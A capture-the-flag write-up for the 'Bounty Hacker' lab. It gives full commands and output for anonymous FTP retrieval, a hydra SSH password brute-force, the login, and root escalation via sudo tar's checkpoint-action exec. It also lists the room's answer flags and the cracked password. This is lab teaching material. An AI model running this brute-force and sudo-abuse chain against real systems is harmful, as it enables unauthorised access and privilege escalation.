# Bounty hacker

## Task 1  Living up to the title.
+ Who wrote the task list? `lin`
+ What service can you bruteforce with the text file found?`ssh`
+ What is the users password? `RedDr4gonSynd1cat3`
+ user.txt`THM{CR1M3_SyNd1C4T3}`
+ root.txt`THM{80UN7Y_h4cK3r}`

### Enumeration
+ nmap -sC -sV 10.10.241.201 -oN nmap.log
+ Port 21 (FTP)
```bash
hengkisirait: BountyHacker $ ftp 10.10.241.201
Connected to 10.10.241.201.
220 (vsFTPd 3.0.3)
Name (10.10.241.201:hengkisirait): anonymous
230 Login successful.
ftp> dir
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt
-rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt
226 Directory send OK.
ftp> mget *
mget locks.txt? y
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for locks.txt (418 bytes).
WARNING! 26 bare linefeeds received in ASCII mode
File may not have transferred correctly.
226 Transfer complete.
418 bytes received in 0.000651 seconds (627 kbytes/s)
mget task.txt? y
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for task.txt (68 bytes).
WARNING! 4 bare linefeeds received in ASCII mode
File may not have transferred correctly.
226 Transfer complete.
68 bytes received in 0.000997 seconds (66.6 kbytes/s)
ftp> bye
221 Goodbye.
```
+ Port 80 (http) posibility user
```bash
spike
jet
ed
edward
ein
faye
lin
```
+ Port 22 (ssh)
```bash
hengkisirait: BountyHacker $ hydra -L users.txt -P locks.txt 10.10.241.201 ssh -V
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-02-28 22:37:25
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 182 login tries (l:7/p:26), ~12 tries per task
[DATA] attacking ssh://10.10.241.201:22/-V
[22][ssh] host: 10.10.241.201   login: lin   password: RedDr4gonSynd1cat3
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-02-28 22:38:25
```

## Exploit
+ Login to ssh using `lin:RedDr4gonSynd1cat3`
```bash
hengkisirait: BountyHacker $ ssh lin@10.10.241.201
The authenticity of host '10.10.241.201 (10.10.241.201)' can't be established.
ED25519 key fingerprint is SHA256:Y140oz+ukdhfyG8/c5KvqKdvm+Kl+gLSvokSys7SgPU.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.241.201' (ED25519) to the list of known hosts.
lin@10.10.241.201's password:
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-101-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

83 packages can be updated.
0 updates are security updates.

Last login: Sun Jun  7 22:23:41 2020 from 192.168.0.14
lin@bountyhacker:~/Desktop$

lin@bountyhacker:~/Desktop$ cat user.txt
THM{CR1M3_SyNd1C4T3}
```

## Privileges Escalation
+ Cheking `sudo -l`
```bash
lin@bountyhacker:~/Desktop$ sudo -l
[sudo] password for lin:
Matching Defaults entries for lin on bountyhacker:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User lin may run the following commands on bountyhacker:
    (root) /bin/tar

lin@bountyhacker:~/Desktop$ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
tar: Removing leading `/' from member names
root@bountyhacker:~/Desktop# ls -la /root
total 40
drwx------  5 root root 4096 Jun  7  2020 .
drwxr-xr-x 24 root root 4096 Jun  6  2020 ..
-rw-------  1 root root 2694 Jun  7  2020 .bash_history
-rw-r--r--  1 root root 3106 Oct 22  2015 .bashrc
drwx------  2 root root 4096 Feb 26  2019 .cache
drwxr-xr-x  2 root root 4096 Jun  7  2020 .nano
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-r--r--  1 root root   66 Jun  7  2020 .selected_editor
drwx------  2 root root 4096 Jun  7  2020 .ssh
-rw-r--r--  1 root root   19 Jun  7  2020 root.txt
root@bountyhacker:~/Desktop# cat root.txt
cat: root.txt: No such file or directory
root@bountyhacker:~/Desktop# cat /root/root.txt
THM{80UN7Y_h4cK3r}
```